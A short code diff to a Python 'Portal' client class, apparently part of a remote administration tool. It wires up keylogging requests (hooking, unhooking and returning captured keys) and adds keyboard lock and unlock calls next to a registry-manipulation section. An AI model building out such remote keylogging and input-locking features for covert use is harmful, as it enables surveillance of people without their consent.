@@ -151,16 +151,15 @@ class Portal:
         return self.request('keylogging', 'hook', '')
     
     def keyboard_unhook(self) -> protocol.Response:
-        """Returns the keys ho
-
-        Returns:
-            [type]: [description]
+        """Returns the keys hooked
         """
         return self.request('keylogging', 'unhook', '')
 
     def keyboard_lock(self):
-        # TODO: implement lock keyboard
-        pass
+        return self.request('keylogging', 'lock', '')
+
+    def keyboard_unlock(self):
+        return self.request('keylogging', 'unlock', '')
 
 
     # ---- Registry manipulation ----
